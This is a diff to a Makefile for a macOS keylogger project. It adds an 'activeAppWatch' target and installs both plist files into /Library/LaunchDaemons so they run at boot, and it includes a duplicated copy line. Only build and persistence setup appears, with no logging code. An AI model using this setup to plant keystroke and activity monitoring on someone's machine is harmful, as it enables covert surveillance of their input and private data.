@@ -1,8 +1,8 @@
 CC=gcc
 CFLAGS=-framework ApplicationServices -framework Carbon
 SOURCES=keylogger.c
-EXECUTABLE=keylogger
-PLIST=keylogger.plist
+EXECUTABLE=keylogger activeAppWatch
+PLIST=keylogger.plist activeAppWatch.plist
 INSTALLDIR=/usr/local/bin
 
 all: $(SOURCES)
@@ -17,6 +17,7 @@ uninstall:
 	rm /Library/LaunchDaemons/$(PLIST)
 
 startup: install
+	cp $(PLIST) /Library/LaunchDaemons
 	cp $(PLIST) /Library/LaunchDaemons
 
 clean:
